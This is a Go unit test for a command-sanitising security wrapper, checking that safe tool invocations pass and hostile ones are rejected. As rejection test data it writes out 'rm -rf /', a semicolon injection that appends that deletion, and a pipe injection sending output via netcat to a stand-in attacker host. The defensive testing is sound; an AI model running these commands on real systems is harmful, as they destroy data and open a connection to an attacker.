package verify

import (
	"context"
	"testing"

	"github.com/fall-out-bug/sdp/internal/security"
)

// TestSafeCommandIntegration ensures we can create safe commands
func TestSafeCommandIntegration(t *testing.T) {
	ctx := context.Background()

	// Test safe commands that should work
	_, err := security.SafeCommand(ctx, "go", "version")
	if err != nil {
		t.Errorf("Safe command 'go version' was rejected: %v", err)
	}

	_, err = security.SafeCommand(ctx, "pytest", "--version")
	if err != nil {
		t.Errorf("Safe command 'pytest --version' was rejected: %v", err)
	}

	// Test unsafe commands that should be rejected
	_, err = security.SafeCommand(ctx, "rm", "-rf", "/")
	if err == nil {
		t.Error("Unsafe command 'rm -rf /' should have been rejected")
	}

	// Test injection pattern rejection
	_, err = security.SafeCommand(ctx, "go", "test; rm -rf /")
	if err == nil {
		t.Error("Command with injection pattern should have been rejected")
	}

	// Test pipe injection
	_, err = security.SafeCommand(ctx, "pytest", "|", "nc", "attacker.com", "4444")
	if err == nil {
		t.Error("Command with pipe injection should have been rejected")
	}
}
